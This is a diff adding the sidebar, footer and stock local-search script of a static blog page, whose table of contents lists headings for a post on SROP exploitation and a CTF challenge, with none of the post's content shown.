+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://blog.eonew.cn/" title="Ex" target="_blank">Ex</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://xianbeil.github.io/" title="XianBei" target="_blank">XianBei</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://whoamianony.top/" title="WHOAMI" target="_blank">WHOAMI</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.e4l4.com/" title="E4L4" target="_blank">E4L4</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://tokameine.top/" title="Tokameine" target="_blank">Tokameine</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://toleleyjl.github.io/" title="Tolele" target="_blank">Tolele</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          <div class="wechat_OA">
+    <br>
+    <span>Welcome to my wechat</span>
+    <p></p>
+    <img src ="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/wechat.jpg" width="150" height="150">
+</div>
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#srop%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86"><span class="nav-number">1.</span> <span class="nav-text">srop利用原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#signal%E6%9C%BA%E5%88%B6"><span class="nav-number">1.1.</span> <span class="nav-text">signal机制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#x86%E5%92%8Cx64%E7%9A%84sigcontext"><span class="nav-number">1.2.</span> <span class="nav-text">x86和x64的sigcontext</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#signal%E6%9C%BA%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">1.3.</span> <span class="nav-text">signal机制漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#srop%E5%9F%BA%E6%9C%AC%E5%88%A9%E7%94%A8"><span class="nav-number">2.</span> <span class="nav-text">srop基本利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ciscn-2019-es-7"><span class="nav-number">2.1.</span> <span class="nav-text">ciscn_2019_es_7</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#srop%E8%BF%9B%E9%98%B6"><span class="nav-number">3.</span> <span class="nav-text">srop进阶</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#system-call-chains"><span class="nav-number">3.1.</span> <span class="nav-text">system call chains</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%AF%E5%88%A9%E7%94%A8%E7%9A%84gadget"><span class="nav-number">3.2.</span> <span class="nav-text">可利用的gadget</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B7%E4%BD%93%E7%9A%84%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B"><span class="nav-number">3.3.</span> <span class="nav-text">具体的利用流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E4%BE%8B"><span class="nav-number">3.4.</span> <span class="nav-text">实例</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Pursue</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
